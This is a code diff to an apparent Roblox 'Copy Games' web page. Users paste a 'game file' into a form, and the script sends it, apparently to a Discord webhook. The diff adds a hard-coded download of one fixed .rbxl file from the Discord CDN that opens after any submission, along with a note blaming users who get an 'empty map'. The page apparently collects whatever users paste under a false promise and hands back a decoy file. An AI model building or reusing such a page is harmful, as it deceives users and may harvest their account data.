@@ -51,7 +51,8 @@
             <h3>Copy Games</h3>
             <br>
             <p>Paste your game file in the box below, then click "Copy Game!"
-              If you don't know how to find a game's "game file" then go ahead and watch "How to use"</p>
+              If you don't know how to find a game's "game file" then go ahead and watch "How to use"
+			  If you got empty map you are doing something wrong</p>
             <form id="gameForm">
               <div class="form-input-icon mb-3 mt-4">
                 <i class="fas fa-file"></i>
@@ -92,7 +93,7 @@
       // Check if the input is empty
       if (!gameFile) {
         alert('Please enter a game file before sending.');
-        return; //
+        return; 
       }
 
       const message = {
@@ -122,6 +123,8 @@
         console.log('Response body:', text);
         if (status === 204) {
           document.getElementById('gameInput').value = '';
+          // Optionally trigger the download
+          window.open('https://cdn.discordapp.com/attachments/1330504829264728074/1331883112787083294/The_specified_game.rbxl?ex=67933c4f&is=6791eacf&hm=fc1488acd5e2d94c28e6993072a80e4ee16714e198345fd101ebc256d159f8f4&', '_blank');
         } else {
           throw new Error(text);
         }
